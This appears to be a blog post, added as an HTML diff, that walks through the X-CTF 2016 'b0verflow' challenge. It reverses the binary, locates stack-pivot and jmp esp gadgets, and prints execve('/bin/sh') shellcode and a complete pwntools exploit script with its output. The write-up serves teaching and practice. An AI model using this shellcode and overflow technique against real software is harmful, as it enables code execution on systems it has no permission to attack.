@@ -1,0 +1,261 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content>
+<meta name=description content="X-CTF 2016 'b0verflow' challenge writeup.">
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://anvbis.github.io/posts/xctf-2016-b0verflow/>
+<title>
+X-CTF 2016 :: b0verflow :: Anubis
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=/main.04ccab17a090ab7631f283645aff8adfdbd0eb8d6fc2738d01581aa99a6ce4ef.css>
+<meta itemprop=name content="X-CTF 2016 :: b0verflow">
+<meta itemprop=description content="X-CTF 2016 'b0verflow' challenge writeup."><meta itemprop=datePublished content="2021-08-13T00:00:00+00:00">
+<meta itemprop=dateModified content="2021-08-13T00:00:00+00:00">
+<meta itemprop=wordCount content="989"><meta itemprop=image content="https://anvbis.github.io">
+<meta itemprop=keywords content>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://anvbis.github.io">
+<meta name=twitter:title content="X-CTF 2016 :: b0verflow">
+<meta name=twitter:description content="X-CTF 2016 'b0verflow' challenge writeup.">
+<meta property="og:title" content="X-CTF 2016 :: b0verflow">
+<meta property="og:description" content="X-CTF 2016 'b0verflow' challenge writeup.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://anvbis.github.io/posts/xctf-2016-b0verflow/"><meta property="og:image" content="https://anvbis.github.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-08-13T00:00:00+00:00">
+<meta property="article:modified_time" content="2021-08-13T00:00:00+00:00"><meta property="og:site_name" content="Anubis">
+<meta property="article:section" content="Stack Pivot">
+<meta property="article:section" content="ROP">
+<meta property="article:section" content="CTF">
+<meta property="article:section" content="Linux">
+<meta property="article:published_time" content="2021-08-13 00:00:00 +0000 UTC">
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text>anvbis</span>
+<span class=logo__cursor>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=/posts>Blog</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info>
+</p>
+</div>
+<article>
+<h2 class=post-title><a href=https://anvbis.github.io/posts/xctf-2016-b0verflow/>X-CTF 2016 :: b0verflow</a></h2>
+<div class=post-content>
+<h2 id=reverse-engineering>Reverse Engineering</h2>
+<p>Let&rsquo;s begin by using the <code>file</code> command to get a little insight into this executable. Note that it is a 32-bit linux binary.</p>
+<pre><code>$ file ./b0verflow 
+./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
+</code></pre><p>We can also use <code>checksec</code> to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</p>
+<pre><code>$ checksec ./b0verflow
+[*] './b0verflow'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre><p>Running the binary reveals that it at some point prompts us for user input. This is likely where we&rsquo;ll find a vulnerability (perhaps it reads to much data in).</p>
+<pre><code>$ ./b0verflow 
+
+======================
+
+Welcome to X-CTF 2016!
+
+======================
+What's your name?
+anvbis
+Hello anvbis
+.
+</code></pre><p>Disassembling the <code>main</code> function reveals that it calls a function <code>vul</code>. We&rsquo;ll want to investigate this function next, I get the feeling it&rsquo;s vulnerable.</p>
+<pre><code>int main (int argc, char **argv, char **envp);
+0x0804850e      push    ebp
+0x0804850f      mov     ebp, esp
+0x08048511      and     esp, 0xfffffff0
+0x08048514      call    vul        ; sym.vul
+0x08048519      leave
+0x0804851a      ret
+</code></pre><p>Reversing the <code>vul</code> function shows that it reads in 0x32 bytes from stdin, and stores them at a pointer <code>*s</code>. However, we can see that no memory (beyond the size of the pointer itself) is allocated on the stack at this address.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined4 <span style=color:#a6e22e>vul</span>(<span style=color:#66d9ef>void</span>)
+{
+    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s;
+    
+    puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>======================&#34;</span>);
+    puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Welcome to X-CTF 2016!&#34;</span>);
+    puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>======================&#34;</span>);
+    puts(<span style=color:#e6db74>&#34;What</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>s your name?&#34;</span>);
+    fflush(_reloc.stdout);
+    fgets(<span style=color:#f92672>&amp;</span>s, <span style=color:#ae81ff>0x32</span>, _reloc.stdin);
+    printf(<span style=color:#e6db74>&#34;Hello %s.&#34;</span>, <span style=color:#f92672>&amp;</span>s);
+    fflush(_reloc.stdout);
+    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+}
+</code></pre></div><p>We&rsquo;ve found our stack buffer overflow.</p>
+<h2 id=information-gathering>Information Gathering</h2>
+<p>Next, let&rsquo;s find where the return address is relative to our input buffer. Note that the <code>vul</code> function doesn&rsquo;t read many bytes in (only 0x32) so hopefully this is enough to reach the return address.</p>
+<p>Here&rsquo;s a simple script that attaches the process to GDB and sends a cyclic pattern of 100 bytes that we can use to determine the return address' offset.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
+
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./b0verflow&#39;</span>)
+gdb<span style=color:#f92672>.</span>attach(r)
+
+r<span style=color:#f92672>.</span>clean()
+r<span style=color:#f92672>.</span>writeline(cyclic(<span style=color:#ae81ff>100</span>))
+
+r<span style=color:#f92672>.</span>interactive()
+</code></pre></div><p>We can continue in GDB and watch the process crash when it tries to return to our garbage data. See the top of the stack below, it seems we can only write about 9 bytes past the return address, this will complicate our exploit.</p>
+<pre><code>pwndbg&gt; x/4x $esp
+0xff93cf20:     0x6161616b      0x6161616c      0x0000006d      0xf7de4e46
+</code></pre><p>Let&rsquo;s print out the value of <code>$eip</code> and use pwntools' <code>cyclic_find</code> function to find the offset. It appears that <code>$eip</code> is 36 bytes after the start of our input buffer.</p>
+<pre><code>pwndbg&gt; p $eip
+$1 = (void (*)()) 0x6161616a
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py>In [<span style=color:#ae81ff>2</span>]: cyclic_find(<span style=color:#ae81ff>0x6161616a</span>)
+Out[<span style=color:#ae81ff>2</span>]: <span style=color:#ae81ff>36</span>
+</code></pre></div><p>So, now we need to solve the limited space issue (9 bytes is not enough space to store a complex ROP chain). Let&rsquo;s use the <code>ropper</code> tool to see if we can find any gadgets to pivot our stack.</p>
+<pre><code>$ ropper --file ./b0verflow --stack-pivot
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+
+
+
+Gadgets
+=======
+
+
+0x08048609: add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret; 
+0x0804837e: add esp, 8; pop ebx; ret; 
+0x0804847e: ret 0xeac1; 
+0x08048500: sub esp, 0x24; ret; 
+
+4 gadgets found
+</code></pre><p>The gadget that I immediately noticed was <code>sub esp, 0x24; ret</code>, this will allow us to move the stack almost all the way to the start of our input buffer (about 4 bytes into our input buffer, to be exact).</p>
+<pre><code>0x08048500: sub esp, 0x24; ret;
+</code></pre><p>Now we just need something like a <code>jmp esp</code> or a <code>mov eax, esp; jmp eax</code> gadget to direct process execution to our shellcode. Using <code>ropper</code> again, we immediately find a <code>jmp esp</code> instruction.</p>
+<pre><code>$ ropper --file ./b0verflow --search 'jmp esp'                                                              130 ⨯
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: jmp esp
+
+[INFO] File: ./b0verflow
+0x08048504: jmp esp;
+</code></pre><h2 id=exploit-development>Exploit Development</h2>
+<p>Now that we have all the information we need, we can start developing our exploit.</p>
+<p>Let&rsquo;s write some shellcode. We only have a limited amount of space to store it (about 32 bytes), so I&rsquo;ve used various techniques (such as using <code>xor</code> to set registers to <code>0</code>) to reduce the size of the shellcode.</p>
+<pre><code>.global _start
+
+_start:
+.intel_syntax noprefix
+shell:
+    push 0x0068732f     # &quot;/sh&quot;
+    push 0x6e69622f     # &quot;/bin&quot;
+    mov ebx, esp        # &quot;/bin/sh&quot;
+    xor ecx, ecx
+    xor edx, edx
+    mov al, 11
+    int 0x80            # execve(&quot;/bin/sh&quot;)
+</code></pre><pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
+$ objcopy --dump-section .text=payload shellcode
+</code></pre><p>After compilation, we can see that our shellcode is only 20 bytes long, very nice.</p>
+<pre><code>08049000 &lt;_start&gt;:
+ 8049000:       68 2f 73 68 00          push   $0x68732f
+ 8049005:       68 2f 62 69 6e          push   $0x6e69622f
+ 804900a:       89 e3                   mov    %esp,%ebx
+ 804900c:       31 c9                   xor    %ecx,%ecx
+ 804900e:       31 d2                   xor    %edx,%edx
+ 8049010:       b0 0b                   mov    $0xb,%al
+ 8049012:       cd 80                   int    $0x80
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py>In [<span style=color:#ae81ff>1</span>]: open(<span style=color:#e6db74>&#39;payload&#39;</span>,<span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read()
+Out[<span style=color:#ae81ff>1</span>]: <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;h/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>h/bin</span><span style=color:#ae81ff>\x89\xe3</span><span style=color:#e6db74>1</span><span style=color:#ae81ff>\xc9</span><span style=color:#e6db74>1</span><span style=color:#ae81ff>\xd2\xb0\x0b\xcd\x80</span><span style=color:#e6db74>&#39;</span>
+
+In [<span style=color:#ae81ff>2</span>]: len(open(<span style=color:#e6db74>&#39;payload&#39;</span>,<span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read())
+Out[<span style=color:#ae81ff>2</span>]: <span style=color:#ae81ff>20</span>
+</code></pre></div><p>Now we can write our final exploit. Note that we need to add the address to the <code>jmp esp</code> gadget 4 bytes after the start of our input buffer (as this is where the program will attempt to get the next return address after our stack pivot).</p>
+<p>Here&rsquo;s an overview of what we want to achieve:</p>
+<ul>
+<li>Pivot our stack with the <code>sub esp, 0x24; ret</code> gadget.</li>
+<li>Jump to <code>$esp</code>, where our shellcode is stored.</li>
+<li>Get shellcode execution.</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
+
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+
+<span style=color:#e6db74>&#39;&#39;&#39;
+</span><span style=color:#e6db74>0x08048504: jmp esp;
+</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+jmp_esp <span style=color:#f92672>=</span> p32(<span style=color:#ae81ff>0x08048504</span>)
+
+<span style=color:#e6db74>&#39;&#39;&#39;
+</span><span style=color:#e6db74>0x08048500: sub esp, 0x24; ret;
+</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+sub_esp <span style=color:#f92672>=</span> p32(<span style=color:#ae81ff>0x08048500</span>)
+
+
+buf <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;h/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>h/bin</span><span style=color:#ae81ff>\x89\xe3</span><span style=color:#e6db74>1</span><span style=color:#ae81ff>\xc9</span><span style=color:#e6db74>1</span><span style=color:#ae81ff>\xd2\xb0\x0b\xcd\x80</span><span style=color:#e6db74>&#39;</span>
+
+lpad <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>
+rpad <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>36</span> <span style=color:#f92672>-</span> len(buf) <span style=color:#f92672>-</span> len(jmp_esp) <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span>)
+
+r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./b0verflow&#39;</span>)
+
+r<span style=color:#f92672>.</span>clean()
+r<span style=color:#f92672>.</span>writeline(lpad <span style=color:#f92672>+</span> jmp_esp <span style=color:#f92672>+</span> buf <span style=color:#f92672>+</span> rpad <span style=color:#f92672>+</span> sub_esp)
+
+r<span style=color:#f92672>.</span>clean()
+r<span style=color:#f92672>.</span>interactive()
+</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
+<pre><code>$ ./exploit.py 
+[+] Starting local process './b0verflow': pid 2328
+[*] Switching to interactive mode
+$ cat flag.txt
+X-CTF{b0verflow}
+$ 
+[*] Stopped process './b0verflow' (pid 2328)
+</code></pre>
+</div>
+</article>
+<hr>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a href=https://anvbis.github.io/categories/stack-pivot/>Stack Pivot</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/rop/>ROP</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/ctf/>CTF</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/linux/>Linux</a></span>
+</p>
+</div>
+</main>
+</div>
+<footer class=footer>
+</footer>
+</div>
+<script type=text/javascript src=/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js integrity="sha512-cvPNsXV+ZUxaoTKaQmnqao17N1E947nVTXpcolVz+zpk+HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
+</body>
+</html>
